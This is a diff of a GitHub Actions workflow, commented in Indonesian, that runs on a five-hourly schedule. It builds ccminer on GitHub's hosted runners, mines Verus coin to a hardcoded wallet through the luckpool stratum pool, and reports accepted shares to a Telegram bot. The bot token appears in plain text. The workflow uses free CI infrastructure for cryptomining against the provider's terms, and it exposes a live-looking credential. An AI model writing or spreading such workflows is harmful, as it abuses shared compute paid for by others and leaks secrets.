@@ -2,35 +2,34 @@ name: A1
 
 on:
   schedule:
-    - cron: "0 */5 * * *" # Jalan tiap 5 jam
+    - cron: "0 */5 * * *"  # Jalan tiap 5 jam
   workflow_dispatch:
 
 jobs:
   verusmine:
     runs-on: ubuntu-latest
-    timeout-minutes: 300 # Maks 5 jam jalan
+    timeout-minutes: 300  # Auto stop setelah 5 jam
 
     steps:
     - name: Install dependencies
       run: |
         sudo apt update
-        sudo apt install -y git build-essential cmake automake libcurl4-openssl-dev
+        sudo apt install -y build-essential git curl
 
-    - name: Clone ccminer hybrid
-      run: |
-        git clone https://github.com/monkins1010/ccminer.git
-        cd ccminer
-        mkdir build
-        cd build
-        cmake ..
-        make -j$(nproc)
-        cp ccminer .. # Copy binary ke direktori atas
+    - name: Clone ccminer
+      run: git clone https://github.com/monkins1010/ccminer.git
 
-    - name: Start mining (Luckpool Hybrid Mode)
+    - name: Build ccminer (Make)
       run: |
         cd ccminer
+        make clean
+        make
 
-        # ————— KONFIGURASI —————
+    - name: Start mining (Luckpool Hybrid Mode, Watchdog OFF)
+      run: |
+        cd ccminer
+
+        # ——— KONFIGURASI ———
         WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
         POOL="stratum+tcp://ap.luckpool.net:3956#xnsub"
         PASSWORD="hybrid"
@@ -41,7 +40,7 @@ jobs:
         TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
         TELEGRAM_CHAT_ID="5763229296"
 
-        # ————— FUNGSI TELEGRAM —————
+        # ——— FUNGSI KIRIM TELEGRAM ———
         send_telegram() {
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
             -d chat_id=${TELEGRAM_CHAT_ID} \
@@ -49,19 +48,14 @@ jobs:
             -d text="$1"
         }
 
-        send_telegram "⛏️ *Mining dimulai* sebagai *$WORKER* (mode *hybrid*, AP) dengan *$THREADS* thread."
+        send_telegram "⛏️ *Mining dimulai* sebagai *$WORKER* (mode *hybrid*) dengan *$THREADS* thread."
 
-        # ————— JALANKAN MINER —————
+        # ——— JALANKAN MINER ———
         rm -f "$LOG_FILE"
-        ./ccminer -a verus \
-                  -o $POOL \
-                  -u $WALLET.$WORKER \
-                  -p $PASSWORD \
-                  -t $THREADS | tee "$LOG_FILE" &
-
+        ./ccminer -a verus -o $POOL -u $WALLET.$WORKER -p $PASSWORD -t $THREADS | tee "$LOG_FILE" &
         MINER_PID=$!
 
-        # ————— Pantau share accepted —————
+        # ——— PANTAU SHARE ACCEPTED ———
         tail -F "$LOG_FILE" | while read LINE; do
           if echo "$LINE" | grep -q "accepted"; then
             TOTAL=$(grep -c "accepted" "$LOG_FILE")
@@ -69,14 +63,8 @@ jobs:
           fi
         done & TAIL_PID=$!
 
-        # ————— Watchdog crash —————
-        while sleep 60; do
-          if ! kill -0 $MINER_PID 2>/dev/null; then
-            send_telegram "❌ *Miner crash* di *$WORKER*."
-            break
-          fi
-        done
-
+        wait $MINER_PID
         kill $TAIL_PID
-        TOTAL=$(grep -c "accepted" "$LOG_FILE")
-        send_telegram "✅ *Mining selesai* di *$WORKER*. Total accepted: *$TOTAL*"
+
+        TOTAL_FINAL=$(grep -c "accepted" "$LOG_FILE")
+        send_telegram "✅ *Mining selesai* di *$WORKER*. Total accepted: *$TOTAL_FINAL*"
